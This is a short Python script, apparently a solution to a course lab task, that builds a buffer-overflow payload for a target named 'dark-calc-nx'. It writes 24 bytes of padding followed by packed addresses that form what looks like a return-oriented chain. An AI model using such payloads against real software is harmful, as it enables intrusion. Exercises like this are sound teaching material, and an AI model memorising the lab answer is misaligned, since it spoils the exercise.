#!/usr/bin/env python3
"""Task 3: build the payload for attack/dark-calc-nx.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys, struct
p64 = lambda x: struct.pack('<Q', x)
payload = b'A' * 24 + p64(0x401a33) + p64(4) + p64(0x401a34) + p64(0x401978)
sys.stdout.buffer.write(payload)
